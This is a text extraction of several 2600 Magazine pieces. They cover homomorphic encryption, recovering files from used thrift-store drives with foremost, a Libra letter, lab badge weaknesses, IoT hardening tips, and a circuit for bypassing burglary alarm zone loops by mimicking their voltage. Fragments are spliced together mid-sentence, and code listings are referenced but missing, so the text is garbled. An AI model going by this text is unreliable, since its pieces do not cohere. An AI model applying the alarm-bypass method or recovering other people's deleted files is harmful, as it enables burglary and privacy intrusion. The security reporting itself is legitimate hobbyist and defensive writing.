 Encr yption
 and Privacy


                                    by Thor Mirchandani

    In the modern world, people are becoming more and more dependent on using other people’s
computers for their storage and computing needs. Cloud technologies, phone apps, and Software
as a Service (SaaS) are just a few examples of applications that rely on other people’s machines.
    Most people understand the absolute necessity for securing their data in the Cloud and rely on
using some form of encryption. Unfortunately, encrypting data in transit or on a cloud disk using
most of the common encryption algorithms is not sufficient to ensure privacy.
    When you browse, view, or manipulate the data, it is decrypted to plain text and becomes
visible to a sufficiently privileged software program. Can you really know for sure who else is
using your cloud instance?
    Even on a hardened system, data can be read directly from CPU registers and data buses by a
motivated attacker. If that sounds far-fetched, this is exactly how hardware hacker extraordinaire
Bunnie Huang hacked the Xbox! For more frivolous examples, consider the technical underpin-
nings of Kraftwerk’s 1981 song “Pocket Calculator.” If individuals can do it, what are the capa-
bilities of more well-funded organizations?

                              Fully Homomorphic Encryption
    The bottom line is that to be usable, information encrypted with traditional methods has to be
visible in plain text at some point, if only for a brief moment. Another way to look at it is that a
man-in-the-middle attack is always possible and as long as the attacker is creative when it comes
to defining where the “middle” is!
    Does it have to be that way? What if we could reliably manipulate encrypted information
without ever decrypting it? Turns out that we can. Enter Fully Homomorphic Encryption (FHE).
    FHE is a class of ciphers that have the interesting quality that an arbitrary computation on
ciphertexts generates an encrypted result which, when decrypted, matches what you would see
had the same computations been performed on the plaintext. Sounds like black magic, doesn’t it?
    Theoretical FHE systems were postulated in the late 1970s. In the following decades,
researchers implemented systems that permitted a limited number and limited types of computa-
tions. Then in 2009, Craig Gentry described a system that could perform any computation, albeit
very slowly. Basic computations would take hours! But it didn’t take long for Gentry and other
researchers to come up with implementations many orders of magnitude faster. Those systems are
finding practical uses today. (Crypto Trivia: Craig Gentry received a MacArthur Genius Award
for his work on encryption.)

                                 A Practical SaaS Example
    One application for FHE is SaaS. Alice might have valuable data and Bob might have a valu-
able algorithm. Neither wants to reveal their “secret sauce” to the other. With traditional encryp-
tion methods, this would not be possible: The algorithm would have to operate on plaintext data,
  Page 6                                                                       2600 Magazine
and Alice and Bob would have to duke it out regarding who should lift the skirt. Typical solutions
to the dilemma involve lawyers and NDAs.
    Moments before he took his last breath, Alice’s grandfather gave her three top secret numbers
that will lead to the map coordinates of the spot where his treasure is hidden. To get the real
coordinates, Alice must add two of the numbers and multiply the third by a constant. Alas, while
cryptographically savvy, Alice is arithmetically challenged and has to enlist outside help.
    Fortunately, Bob runs a service that can add and multiply encrypted numbers. Alice agrees to
send Bob her FHE encrypted numbers. Bob will then perform the calculations on the two numbers
without ever seeing them in plaintext. Calculations completed, Bob returns the encrypted results
to Alice without ever seeing the plaintext results. When Alice gets the results, she can simply
decrypt them to get the coordinates.
    We are implementing this interaction in Python - see the listing for fullyhomo.py that follows
this article. The code was written for Python 3, but should work fine with Python 2 as well. It will
run on Ubuntu Linux using any one of the following three commands:
./fullhomo.py
python3 fullhomo.py
python fullhomo.py
   Similar commands are available on Windows. Here is a typical output from running the
program:
~/projects/homomorphic$ ./fullyhomo.py
SaaS Example:
Alice wants to use Bob’s calculation service to calculate 5 + 10
She encrypts 5
...and the encrypted value is 408231311223330758911876050904...
She then encrypts 10
...and the encypted value is 6811593647043826157618544194678...

Alice also wants to to multiply 6 with the constant 3
She encrypts 6
...and the encrypted value is 275872367736262799842862895600...

Then Alice sends the encrypted values to Bob along with her public

                                            The Code
    The Python code implements an FHE algorithm called the Paillier cryptosystem. To keep
things brief and simple, the code only implements the operations required to for the addition and
multiplication operations. Also, the key pair is hard coded for the sake of simplicity. A full fledged
implementation would provide code to generate random keys.
    The class FullyHomoCipher on line 14 is the Paillier encryption code. The class BobsCalcula-
tionService on line 54 defines the operations for addition and multiplication of Paillier-encrypted
values.
    Our treasure hunt adventure starts on line 75 and uses the two classes described above.
It’s extensively commented in order to make it easy for the interested reader to modify and

   A note of caution for readers that aren’t familiar with the Python language: Unlike most
languages, Python is white-space sensitive, and indentation matters. It’s important to preserve the
indentation or the program will not execute properly.

                                  FHE Now and Tomorrow
    Our SaaS example is obviously a toy, but that’s to be expected from about 140 lines of
commented Python code. More robust, fully featured FHEs built around stronger algorithms are
finding new applications every day.
    Software as a Service is only one application that’s a good match for FHE. Other types of
applications include smart contracts, block chain systems, data mining, “vanity” hashes, end-
to-end encrypted database queries, anonymous identity systems, data integrity verification, and
so on. With the rapid development in the field, we can expect many other uses in the very near
future.
    FHE is currently deployed across several industries and problem domains, including elec-
tronic voting systems, genomics, and payment systems, and we predict widespread adoption in
areas such as health care, smart power grids, and finance to take place very soon.

 Online Thrift Stores Have Your Data
                                          by base64xor

   When it is decided that a PC or laptop is of no use, do individuals or organizations alike
dispose of or resell the system and the hard drives? From reviewing online offers, there are
those that decide to resell or donate the system or drives to a thrift reseller.
   Perhaps you have used a computer or uploaded a file to a computer of a friend or family
member, at a library, a photo kiosk, a print store, or other fine establishments. When those
systems are of no use, the system or hard drives from that system may be donated to a thrift
store. You may have personal data at risk of exposure to others unknown to you and outside
of your control.
   So are hard drives that are sold by a thrift reseller routinely wiped of all data? Could one
buy hard drives from an online thrift store and then recover files from the hard drive? To
determine how easy it is to recover files from used drives bought at a thrift store, I decided
to buy a few hard drives online and attempt to recover data.
   To start off this research, I picked a popular website that sells hard drives from locations
around the country. I selected two older Western Digital drives that were offered from a thrift
store in South Florida. I purchased the two drives for $21 including shipping and handling.

Partition Tablet Type: MBR
File System Type: NTFS
    The online description of the hard drives stated the drives were “formatted several times,”
so perhaps the data was wiped before the drives were placed for sale. But of course, format-
ting does not erase data. In order to temporarily connect the drives externally to a computer,
I purchased a USB to SATA cable kit at an online store for under $10.
    I needed the kit in order to connect the drives to an older iMac of mine that is running the
Ubuntu Mate Linux distribution. When the drives arrived, I connected the first drive to my
iMac. The cable kit worked, and the Ubuntu Mate system recognized the hard drive.
    The Linux file explorer displayed an empty folder for the hard drive. Nothing there, no
files present! So I needed to install a program designed to recover deleted data. In order
to attempt data recovery from the hard drives, I installed the program foremost which
allows for recovery of deleted files from a device or disk image.
    The command that I ran to install foremost: sudo apt-get install foremost.
After the program was installed, I then ran a foremost command to recover office files:
sudo foremost -v -t ole -i /dev/sdb1
    Foremost ran for one hour and 18 minutes, and created a directory called “output” with
subdirectories of file types and the “audit.txt” file. The program recovered 123 office files.
Since the recovery of the office files answers my question as to whether the disk was wiped,
I did not attempt to recover additional file types.
    Extracted from the Audit file:
-----------------------------------------
File: /dev/sdb1
Start: Tue Nov 13 18:22:14 2018
Length: 232 GB (250058113024 bytes)

Finish: Tue Nov 13 19:40:42 2018
123 FILES EXTRACTED
ole:= 123
-----------------------------------------
   I disconnected the first drive and then connected the second drive to my iMac. Once
again, the system displayed an empty folder when I first connected the drive. I then ran the
same foremost command to recover office files, and the program ran for two hours and
40 minutes, recovering 1321 office files.
   Extracted from the Audit file:
-----------------------------------------
File: /dev/sdb1
Start: Thu Nov 15 04:18:50 2018

Finish: Thu Nov 15 06:58:14 2018
1321 FILES EXTRACTED
ole:= 1321
-----------------------------------------
   So from this research, I found that online thrift stores may sell hard drives that are not
zeroed of all data. I was able to recover office files from both hard drives. In order to ensure
that all data is wiped from a hard drive, a program must be used which writes data across the
entire disk several times. Such a program is usually described as meeting U.S. government
specifications for erasing digital data from storage devices. In this case, the drives were not
wiped of data and I demonstrated how easy it is to recover files.
   So think twice before you use a computer system that is not or will not remain under
your direct and personal control until the hard drives are either destroyed or properly wiped
of data.

Dear 2600:
    The recent announcement by Facebook to roll
out their own virtual currency called “Libra” brings
a huge question. What are the major downsides to
having such a currency available to users? Let’s first
start with a major technology company having con-
trol over their own currency without having the so-
called same oversight as major financial institutions
which can lead to various issues like data breaches,
volatility, privacy matters, processing of transac-
tions, etc.
    Data breaches routinely happen within all indus-
tries anyway, but when a technology company such
as Facebook (or any social networking site) has plans
to roll out their own currency, this can be magnified
since there isn’t the same level of regulation which a
normal financial institution would experience when
data gets stolen leading to a potential hardship to a
customer’s wealth. Secondly, there is much volatil-
ity regarding virtual currency. Who says it’s going
to stay stable for users or even potential users in the
future, since there would be no guarantee it wouldn’t
decline even a little bit? Users want stable currency
for financial transactions, not ones which tend to             The shrink wrap is a nice touch. But it goes to

like playing the stock market instead of relying on         and will be snatched up by somebody. We’re almost

     As a curious and ponderous individual, I am
constantly observing and poking at the security mea-
sures before I even enter the front door. To enter the
labs after getting into the lobby, you need to wave
your badge over the reader. Normally, your person-
alized badge has a crappy picture of yourself on it,
along with your full name. These pictures are too
small to be clearly seen from six feet away and are
often faded. If you lose your badge, you can request
a temporary, which omits basically all visible per-
sonalization from it - you are “supposed” to return
them at the end of the day, but they do get lost. If
some mal-intent individual were to come across a
temp badge, they might be tempted to use it soon
- fortunately, the temp badges expire after 24 hours.
Use it before you lose it. On that note, I noticed that
the RFID badges still work even when I have mine
in my pocket. One could conceal the poor picture
while still using the badge. Of course, employees oc-
casionally hold the door open for each other, which
is a no-no, a fact that is only posted inside the labs.

    Look, all of the things I’ve listed above can be mitigated by the corporate goons who give
fractions of a damn. But that’s partially the point. Remember, they don’t have time to mess around
with edge cases like you (unless you’re doing much nastier things, in which case you’ll need
even more OPSEC), they aren’t using secret spy tools to find you, and all they really want to do
is conclude whether you’re a threat. So why not help them out and bring them to the conclusion
that you want?
    And if you are like I was, working as a shady corporate spy, do something better with your
brain than helping corporations bully people.

                             “Preventing IoT Device Attacks"
    Attack surface reduction” is a security principle that you can use to guide your choices when
designing an IoT product or service. The attack surface of a hardware or software environment
is all of the different points where an unauthorized user can try to insert or extract data. Keeping
the attack surface as small as possible is an essential but necessary security measure. Since
devices like the ESP8266 and others have come along, anyone can be an IoT device developer
for about $5.
    With IoT, there are at least two attack surfaces. The thing itself, say an Internet-connected
temperature sensor, and the service - whether Google Cloud, Microsoft Azure, or Amazon
AWS, etc. Since web service security has been discussed a ton in 2600 Magazine and other
publications, let’s go over device security, from the easiest first.
    These “ten things” are not everything you’ll have to worry about, but it’s a good start, and
if you do these, you’re ahead of 99 percent of IoT vendors.
    #1 Require login and password. This is number one because it’s the bare minimum. Don’t
have an open, network-accessible interface to your IoT device. You may think “oh nobody is
going to guess the URL or the port number” but that’s the first thing attacks probe. Even if it’s
on an intranet, require some authentication!
    #2 Don’t have default logins and passwords. We mentioned this before, but it bears repeating
because it’s so common! Make sure your device has a unique, unguessable password by default.
    #3 Two-factor authentication. In addition to a username and password, maybe have an SMS
or time-based second factor. 2FA will protect you even if the password is sniffed or stolen. 2FA
is free and pretty easy to implement these days - you no longer have to distribute a physical
token, since most everyone has a mobile phone.
    #4 Require TLS/SSL. Whenever your users or devices connect to the Internet, whether over
Wi-Fi or cellular, use the latest available version of TLS, sometimes called SSL or HTTPS.
TLS will encrypt all data transmitting between the device and the service, protecting both. TLS
will significantly reduce your risk of sniffing. A few years ago, microcontrollers were older
and smaller and couldn’t effectively run a TLS stack. Nowadays, there’s no excuse to skip it.
    #4.5 Authenticate Host Certificates. TLS is not just data encryption; it’s also server authenti-
cation. So, if you’re using TLS, make sure your device is checking the fingerprint or certificate
chain of the server. We’ve seen some TLS implementations where it’s possible to skip this,
which makes man-in-the-middle attacks possible.
    #5 Turn off any unused services. If you have an embedded Linux or RTOS for your device,
make sure no services are running. File sharing, remote login, mail servers, etc. These days,
most services are not enabled by default, but check anyway. Sometimes these are left on during
development and are forgotten when the firmware is released.
    #5.5 Don’t accept any inbound connections. If you can, don’t allow any way for outside
parties to connect into the device. If you have a debugging port left open, that’s just another
attackable surface.
    #6 Require physical access for important configurations. We’ve seen some Wi-Fi cameras
that can be controlled over the Internet, but if you want to change the access point password,
you need to plug it into a computer and change the setting over USB. This reduces the surface
that can be attacked by automated scripts.
    #7 Individualized/Revocable Authentication Keys. For your device to connect to the service,
chances are it has some authentication key or password. Make sure that you have a unique key
or password for each device - even if the user never sees these, you shouldn’t reuse them. You’ll
  Page 52                                                                      2600 Magazine
also need to have a way to revoke/re-instantiate keys if they’re lost, corrupted, or stolen.
    #8 Data Paranoia. Even though you may only be shuffling data from your IoT device to
your IoT service, don’t trust that the data is well-formatted. This is often forgotten in a rush to
complete and ship firmware, but you should assume that attackers will try to send corrupted or
malformed chunks of data to both sides of the connection to corrupt memory. Clean up and vet
data thoroughly; this will also keep your device running smoothly if the network connection
is flaky.
    #8.5 Updatable Firmware. Bootloaders are the best, and it’s a good idea to have one on your
device. Many are write-only so that the deployed firmware can’t be read. Being able to update
firmware will help customers recover the device if it gets bricked, hacked, or if there’s a critical
security update. We like USB bootloaders the best, or ones where you insert an SD card with
a file. Having updatable firmware increases your attack surface a bit because it opens another
access point into your device, but we think that if someone has physical access, they could
connect a JTAG programmer to erase and reprogram it anyways.
    #9 Secure storage for authentication keys. Embedded Linux devices have a regular file-
system, and microcontrollers often store their code in flash memory, so even if your hard-code
authentication keys in flash or EEPROM, it can be read out. Yes, even if you have a chip that
has firmware-readback turned off, it’s possible to glitch chips into revealing their secrets. Your
microcontroller memory should not be considered secure storage! Instead, you may want to
consider using a secure element chip. These chips are designed to withstand common decap-
ping and glitching attacks and can be programmed with the private key at your factory. Then, it
never leaves the secure chip. Instead of having the key sit in microcontroller memory where it
could be read out, data that needs to be authenticated or encrypted is sent back and forth through
I2C. It’s a little extra cost, but it is an excellent way to keep the secrets in a lock-box.
    #10 Over the air updates. This one is a little tricky. Not having OTA is risky because then
there’s no way to send important security updates. On the other hand, having OTA is dangerous
because it allows an attacker to take over the device completely. We think OTA is a good idea,
but you need to combine it with the prior rules - firmware must be transmitted over an authenti-
cated, encrypted connection. Having firmware be signed with public-key cryptography (so the
private key is not stored on the device) is a common idea, but be aware that private keys can
leak out. so that should not be the only way you verify the firmware is valid.
    We’ve seen more than one company accidentally “brick” their devices with a mistaken OTA
- some even required a physical recall - so if you do have OTA updates, make sure you always
have a way for physical-access-rollback.
    For both your IoT device and service - if it has a web interface, it should be protected against

    After connecting to the zone wires (tapping connectors to zone loop wires), the circuit first
checks for connection’s polarity. This is done by sub-circuits with operational amplifier U2D,
with resistors R10, R5, R6, diode D1, and capacitor C2. If the measured voltage on R10 is nega-
tive, it will automatically reverse input by drawing transistor Q2 and switched relay RL1 and D4
as LED lights ON.
    If someone wants to bypass these sub-circuits, they need to measure polarity or modify
circuits to measure the positive or negative polarity and tap properly to the zone input’s wires.
The sub-circuits R12 and R11 measure an actual zone input voltage through the relay contacts of
RL1 and RL2. Relay RL2 will switch when we decide to change status from reading a zone loop
voltage to attacking a zone loop input of the burglary alarm system.
    The LCD1 display will print the measured voltage level of a zone loop. It receives measure
data through the I2C’s communication from the Arduino Uno micro-controller. This sub-circuit
may be omitted, however. Wait a few seconds allowing measuring of the zone loop voltage level
before switching to attack mode. The voltage input/output divider (R11/R11+R12) was set for
ratio 1:4 for AD input voltage level requirements.
    When an SW2 switch is on, the Arduino Uno supplies voltage at a level as was measured to
the zone loop wires through the D/A interface based on MCP4725 interface and the amplifiers.
The amplifier U2A with resistors R19 and R20 amplifies input four times and supplies it to the
buffering amplifiers U2B and U2C (outputs connected in parallel) with an output voltage level
that equals what’s measured on a zone loop. This voltage is now presented on a zone loop, and
switching SW1 (sensor) should not change the zone input voltage level of a burglary unit. In most
cases, the attack should have a success rate of 90 percent in the modern burglary alarm systems.
    Switch SW1 simulates a door contact open/close status if someone wants to play with circuits
in a circuit simulation program. Do not forget to add a grounding referenced resistor, as the
device itself presets the floating type voltage source.
    LCD1 and IC1 are sub-circuits of LiquidCrystal_I2C LCD Arduino sketch (model: YWRobot
Arduino LCM1602 IIC V1).
    Programming was done as easily as possible for a “dumb programmer as myself.”
    The code for Arduino is presented below:

              We Did It!
           It took many years and lots of caffeine,
   but we’ve finally finished two major digitizing projects.
Every full volume of The Hacker Digest has now been digitized into
PDF format. Each digest is comprised of that year’s issues of 2600.
That means you can now get every single year of 2600 going back to
1984. If you’re the kind of person who wants it all, then this may be
                  just what you’ve been waiting for.

For $260 you can get EVERY YEAR from the beginning and EVERY
YEAR into the future - all completely copyable and able to be viewed
on multiple devices. You’ll be amazed at how much hacker material
                      will be at your fingertips.

             AND THAT’S NOT ALL!
 Every single recorded talk from all of our conferences is now available
 on flash drives or downloadable from our store - all DRM-free so you
 can make as many copies as you want. They’re completely uncut,
        have no annoying YouTube ads, are in the highest quality,
                 and can be played virtually everywhere.

 Want a collection of ALL of the talks from every single HOPE conference?
 For $249, you’ll get a bunch of 128gb flash drives chock full of talks from
  all 12 of our conferences, along with helpful navigation and descriptions.

Seychelles. Spotted in Beau Vallon and operated
by Airtel, one of two cellular providers. Sadly, this Iceland. This standard model has been around since
phone has been vandalized, is no longer maintained, the 1980s and was found in Tálknafjörður, a town in
and doesn’t work.                                     the northwest of about 250 people.

                                                      Hong Kong. This phone is under cover, which is
Malaysia. Here are a couple of completely different
                                                      how it’s stayed in such great condition. If you look
and colorful types of payphones living in peace and
                                                      carefully, you’ll see that the old “999” emergency

      The Back Cover Photos
                                                              There’s quite a story behind this
                                                            sign, discovered by Jon Guidry in
                                                             the Perimeter Mall in Dunwoody,
                                                             Georgia. We all know a 404 error
                                                               means a page on the web isn’t
                                                               able to be found. But this was
                                                               actually a reference to nearby
                                                              Atlanta’s area code (which used
                                                              to cover the entire state). Sadly
                                                             enough though, since this picture
                                                            was taken, this branch has closed -
                                                             meaning it’s not able to be found.
                                                                And so the irony completes.




We’ll just say it now. We want
 this banner. We’ll even wear
 all the protective equipment
it’s telling us to whenever we
 engage in hacking if we can
  just have it to proudly hang
 somewhere. This was found
   by Wreckage Brother at
  the Pasar Seni MRT station
 in Kuala Lumpur, Malaysia.
   We suspect this wasn’t in
  fact some sort of crude pen
testing operation, but rather a
 drilling/construction project.




    If you’ve spotted something that has “2600” in it or anything else of interest to the hacker
   world (such as funny uses of “hacker,” “unix,” “404,” you get the idea...), take a picture and
   send it on in! Be sure to use the highest quality settings on your camera to increase the odds
    of it getting printed. Make sure and tell us where you spotted your subject along with any
       other info that makes it interesting - many photos are eliminated due to lack of detail.
